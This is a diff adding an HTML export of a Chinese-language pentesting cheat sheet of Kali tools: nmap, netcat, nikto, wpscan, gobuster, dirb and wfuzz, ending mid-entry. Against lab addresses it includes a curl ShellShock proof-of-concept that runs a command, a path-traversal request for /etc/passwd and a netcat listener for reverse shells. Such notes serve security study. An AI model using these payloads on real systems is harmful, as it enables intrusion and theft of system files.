@@ -1,0 +1,685 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Sec Tools</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="d59e1327-017b-4fa1-a055-da9bb778b0b4" class="page mono"><header><div class="page-header-icon undefined"><span class="icon">🧰</span></div><h1 class="page-title">Sec Tools</h1><p class="page-description"></p></header><div class="page-body"><p id="0507eb71-36f1-4514-9dff-25b2a8f48c0c" class="">以下Sec Tools大部分基于Kali Linux发行版，为其自带工具</p><div><nav id="bea01da7-6eac-4a82-bd68-859983a00112" class="block-color-gray table_of_contents"></nav></div><h1 id="eb2b60cc-9f95-4e77-ad3e-ca4a89a386a3" class="">扫描器</h1><h2 id="06b0c43d-acfb-493e-902a-b91bee92b905" class="">arp-scan</h2><figure id="fbde26ce-f23a-477b-8a9a-2e3d1fe245de"><a href="https://www.netscantools.com/nstpro_arp_scan.html" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">ARP Scan Tool in NetScanTools Pro</div><div class="bookmark-description">NetScanTools Pro ARP Scanning Tool can find all connected and active IPv4 devices in a local subnet.</div></div><div class="bookmark-href"><img src="https://www.netscantools.com/favicon.ico" class="icon bookmark-icon"/>https://www.netscantools.com/nstpro_arp_scan.html</div></div></a></figure><p id="68e6f420-27aa-4b6b-a269-b04f9047a115" class="">Since ARP is non-routable, this type of scanner only works on the local LAN</p><h3 id="e560d005-b58c-404a-b6b9-8b4cae16b1b0" class="">主机发现</h3><ul id="de68ae2f-2760-426d-8662-c6243c4223a0" class="bulleted-list"><li style="list-style-type:disc">sudo arp-scan -l</li></ul><figure id="51964cb3-b5d1-4d43-b287-f00739800b81" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled.png"><img style="width:1440px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled.png"/></a></figure><h2 id="0917b580-00d3-43ec-a497-57cd05fc4892" class="">nmap</h2><h3 id="fdd7b534-b757-4889-827c-504e902fbb6e" class="">主机发现</h3><ul id="a765d44d-b088-41f7-89a1-6f5f8ee3e9f2" class="bulleted-list"><li style="list-style-type:disc">-<mark class="highlight-yellow">sn</mark>(no<mark class="highlight-yellow"> </mark>ports<mark class="highlight-yellow"> </mark>scan) 10.10.10.0/24</li></ul><h3 id="9bd04a15-60e3-46d8-be34-319019160ee7" class="">端口扫描</h3><ul id="c8c6074e-0a7e-4c4a-baa1-6c09cb30d405" class="bulleted-list"><li style="list-style-type:disc">-sT —min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports</li></ul><h3 id="3a69c173-cbeb-432b-93bc-ceb8e96a997d" class="">详细扫描</h3><ul id="8eeb2a43-5975-46e4-8b78-688dac04dfe1" class="bulleted-list"><li style="list-style-type:disc">-<mark class="highlight-yellow">sT</mark> -<mark class="highlight-yellow">sV</mark>(ersion) -<mark class="highlight-yellow">sC</mark>(scriprt) -<mark class="highlight-yellow">O</mark>(S) -<mark class="highlight-yellow">oA</mark>(All forms of outputs) ⇒<mark class="highlight-yellow"> </mark><mark class="highlight-red">Heavy scan, less ports needed</mark></li></ul><h3 id="c1834c4c-3f1e-4a1d-b747-637224c36a95" class="">UDP扫描</h3><ul id="85872020-d3c3-499b-ba2f-f05b0fab7f40" class="bulleted-list"><li style="list-style-type:disc">-<mark class="highlight-yellow">sU</mark>(udp<mark class="highlight-yellow"> </mark>scan) —top-ports 20 10.10.10.21 -oA nmapscan/udp</li></ul><h3 id="13a9162f-4a50-4a79-b537-a4ca0cbfa2ce" class="">漏洞脚本扫描</h3><ul id="e493179a-c3b7-4f20-b647-8270e13e833b" class="bulleted-list"><li style="list-style-type:disc">—script=vuln -p21,80,22,3306 10,10,10,21 -oA nmapscan/detail</li></ul><h3 id="c54cb43e-5645-45ab-8484-e9ee0cc4b499" class="">提取端口号</h3><p id="ebf4b84c-6fed-4c3e-9166-521d37fe4d3b" class="">grep open nmapscan/ports.nmap</p><figure id="55928c34-bcb3-44a2-9deb-90039a3bc96e" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%201.png"><img style="width:962px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%201.png"/></a></figure><figure id="82a1cd70-16bc-48ff-8973-e4d0eca2e385" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%202.png"><img style="width:1142px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%202.png"/></a></figure><h2 id="0ce8ace6-10d6-4099-bc76-f898ca942131" class="">netcat</h2><h3 id="ad2051cf-a816-4f16-961c-50bc74df53d6" class=""><mark class="highlight-red">监听</mark></h3><p id="234e4279-04b7-4b58-9fc0-49c9d83a6710" class=""><mark class="highlight-red">端口信息，收到反弹shell</mark></p><p id="36dbff3b-cc2c-4ca8-8d79-da329ba02a1d" class="">sudo nc -<mark class="highlight-yellow">lvnp</mark> 4444</p><p id="7897231d-bb6a-4a83-be2d-32f135d64b66" class="">looks like the port is decided by the attacker</p><figure id="39020a14-9727-48c5-9749-d27c36fe3be6" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%203.png"><img style="width:784px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%203.png"/></a></figure><h3 id="281a72e6-1637-4fb3-8034-d928c4173583" class="">传送文件</h3><ul id="b4a8352e-d822-46f7-82f2-bb272b91ad7a" class="bulleted-list"><li style="list-style-type:disc">发送端：nc -<mark class="highlight-yellow">w</mark>(ait secs) <mark class="highlight-yellow">3</mark> 192.168.1.100 12345 &lt; example.txt</li></ul><ul id="8bcc6c6f-f140-4bec-b743-0b7d7e1103d7" class="bulleted-list"><li style="list-style-type:disc">接收端：nc -l -p 12345 &gt; received_file.txt</li></ul><h2 id="3b25b2e7-76d7-44de-8b6f-058aaad1ad69" class="">nikto</h2><ul id="90fafb62-19a7-4470-b3c9-0f6cdffef4c5" class="bulleted-list"><li style="list-style-type:disc">sudo nikto -<mark class="highlight-yellow">h[ost] </mark>10.10.10.19 -<mark class="highlight-yellow">useproxy</mark> http://10.10.10.19:3128</li></ul><h2 id="8cadfdb4-f030-49e0-a0b0-d02b86100d02" class="">wpscan</h2><ul id="e6221219-58d4-49aa-aa29-23a590c6734b" class="bulleted-list"><li style="list-style-type:disc">sudo wpscan —<mark class="highlight-yellow">url</mark> http://10.10.10.22/wordpress -<mark class="highlight-yellow">e</mark>(numeration) <mark class="highlight-yellow">u[1-5/10]</mark>(User IDs range) -<mark class="highlight-yellow">o</mark> report/wordpress.txt</li></ul><h1 id="a269238f-21e6-4d80-b5b1-b445ae785def" class="">网络工具</h1><h2 id="ac7336fb-2c95-4147-bfa2-c5b21a80671b" class="">url传输</h2><h3 id="1224118f-dae0-4445-b521-0c5943ea2009" class="">curl</h3><ul id="ab94755e-88b0-4780-aeff-1e8d6c5aebbe" class="bulleted-list"><li style="list-style-type:disc">curl -<mark class="highlight-yellow">v</mark>(erbose) —<mark class="highlight-yellow">proxy</mark> http://10.10.10.19:3128 http://10.10.10.19cgi-bin/status -<mark class="highlight-yellow">H</mark>(eader) “<mark class="highlight-red">Referer:() {  test;}; echo ‘Content-Type: text/plain’; echo; echo; echo; /usr/bin/id;exit</mark>”<mark class="highlight-red">（ShellShock的POC）</mark></li></ul><ul id="791cad66-23c0-4f03-9acf-67716021520b" class="bulleted-list"><li style="list-style-type:disc">curl —<mark class="highlight-yellow">data-encode</mark> ‘urlconfig=../../../../../../../../../etc/passwd’ http://10.10.10.21/administrator/alerts/alertConfigField.php</li></ul><h2 id="7470b0b4-c1b9-4205-864d-6a569ea15153" class="">文件下载</h2><h3 id="02697d97-a4af-4353-8998-cbe4f27b267a" class="">mget &amp; get</h3><ul id="c1110f52-d646-4dbe-8bec-f15ee1c6628c" class="bulleted-list"><li style="list-style-type:disc">mget *.txt 多个文件</li></ul><ul id="3c8b9ad6-3850-4243-bdad-ffb3306680c7" class="bulleted-list"><li style="list-style-type:disc">get 单个文件</li></ul><h3 id="63167c08-a5eb-4da3-8a71-f2b2bf1557a2" class="">curl</h3><ul id="416d79bc-3e42-4eb7-b0dd-697eb7582a59" class="bulleted-list"><li style="list-style-type:disc">sudo curl http://10.10.10.22/index.php?<mark class="highlight-red">file=location.txt</mark> &gt; <mark class="highlight-red">report/wrongnotice.txt</mark></li></ul><h2 id="4f1fe4e4-064d-451e-8598-9078deadcda4" class="">wget</h2><ul id="0d9364d6-e36d-443b-979c-2c0924f0a730" class="bulleted-list"><li style="list-style-type:disc">配合php —S 等在本地打开服务器， 用 wget http://10.10.10.3/45011 上传</li></ul><h1 id="c551a662-4fce-4b07-853b-9ae9ba081d69" class="">编码工具</h1><h2 id="df43e999-a1a7-4d04-8a5d-533ab46f369d" class="">hash-identifier</h2><p id="76344ac4-a098-44ff-9daf-68321336fc05" class="">查看编码类型</p><figure id="d29fa022-5430-4919-be76-3e0f27fb8cca" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%204.png"><img style="width:336px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%204.png"/></a></figure><h2 id="be4d970b-fbde-4c15-b9d5-e268529fc863" class="">md5sum</h2><p id="a7441187-d223-420a-856a-09af94ba0908" class="">破解出明文后用来检验</p><p id="7dad4507-001a-415e-b97c-9448723c65b2" class="">echo -n ‘This is not a password’ | md5sum</p><figure id="39c6bff1-1b21-4f25-9eff-e0e88f2c54c1" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%205.png"><img style="width:1402px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%205.png"/></a></figure><h2 id="1c01e8f4-4645-451b-840a-659cf9b4aa51" class="">base64</h2><p id="d372949b-bf80-43be-b4ae-fd37691d42d4" class="">无法用工具识别</p><figure id="31de9580-fd87-4ecf-956c-dbd7d7fba509" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%206.png"><img style="width:1404px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%206.png"/></a></figure><h2 id="67924ab0-d78a-4b29-af88-88756878dc50" class="">rev（Kali自带）</h2><p id="44837d3b-54ba-44e3-9252-8c9b329ce6ff" class="">逆置</p><h1 id="08ce8f0b-e9cd-446b-a9a3-583044bea97b" class="">目录爆破</h1><h2 id="bfe58c14-c094-4ef2-a660-c733678763d8" class="">gobuster</h2><p id="de6dab63-1e6c-40b1-96b3-80bdd06e4029" class="">gobuster dir -<mark class="highlight-red">u</mark> 192.168.1.3:80 --<mark class="highlight-red">wordlist</mark>=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -<mark class="highlight-red">x</mark>(指定文件头类型) html,php</p><figure id="ad77dcf3-fe29-4cb5-aca0-213fa20fd3f5" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%207.png"><img style="width:1484px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%207.png"/></a></figure><h2 id="6436d6e6-4228-414d-9e68-25fa0a773445" class="">dirb</h2><ul id="e29b104a-7d78-41ae-99cc-f26e0b85c2eb" class="bulleted-list"><li style="list-style-type:disc">sudo dirb http://10.10.10.21</li></ul><ul id="99c8e006-5670-4fee-8ce8-74f03183dab2" class="bulleted-list"><li style="list-style-type:disc">sudo dirb http://10.10.10.19 -<mark class="highlight-yellow">p</mark>(roxy)(<mark class="highlight-red">代理服务器</mark>) http://10.10.10.19.<mark class="highlight-yellow">3128</mark> (port of which the web proxy server is using)</li></ul><ul id="9f934f6f-9196-43c5-9f08-5c956cf7a460" class="bulleted-list"><li style="list-style-type:disc">dirb <a href="http://10.10.10.22">http://10.10.10.22</a> -<mark class="highlight-yellow">X</mark>(extension) <mark class="highlight-yellow">.zip,.txt</mark>(指定扩展名) -<mark class="highlight-yellow">o</mark> report/dirbveryhard.txt</li></ul><h2 id="e27b535f-ae8b-4a29-88ea-f780165db801" class="">wfuzz</h2><p id="8951aecc-a0c8-43d2-aa9c-3b23e1946e64" class="">FUZZ, FUZnZ.. will all be replaced</p><p id="6a8610ad-02c5-4002-bbf2-0fbefe9df345" class="">For strings with the same color in the examples below, the latter string will be replaced by the former one </p><ul id="37f81cc6-dcc4-4034-afc8-7fdda58cb95e" class="bulleted-list"><li style="list-style-type:disc">wfuzz -<mark class="highlight-yellow">c</mark>(olor) -<mark class="highlight-yellow">z</mark>(payload) <mark class="highlight-red">file,/usr/share/wordlists/dirb/common.txt</mark> 